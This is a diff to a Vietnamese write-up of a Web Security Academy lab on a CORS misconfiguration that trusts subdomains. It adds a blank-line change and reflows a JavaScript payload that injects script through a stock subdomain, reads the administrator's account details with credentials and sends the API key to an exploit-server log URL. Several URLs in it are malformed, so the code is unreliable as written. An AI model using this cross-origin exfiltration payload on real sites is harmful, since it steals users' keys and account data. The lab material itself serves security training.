@@ -169,10 +169,18 @@ Trang web này có cấu hình CORS không an toàn ở chỗ nó tin cậy tấ
 Hãy tạo một số JavaScript sử dụng CORS để truy xuất khóa API của quản trị viên và tải mã lên máy chủ khai thác của bạn. Lab được giải quyết khi bạn gửi thành công khóa API của quản trị viên.
 
 Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: wiener: peter
-  
+
+
+Trong bài này chúng ta có 1 trang web bán hàng như sau : 
+
+
+
 ```
 <script>
-   document.location="http://stock.https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-ac131f241ecbc63281092d6d012d001e.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+   document.location="http://stock.https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net/?productId=4
+   <script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://https://acfb1faa1ec0c6ec81f22d5200ae00ad.
+   web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() 
+   {location='https://exploit-ac131f241ecbc63281092d6d012d001e.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 ```
   
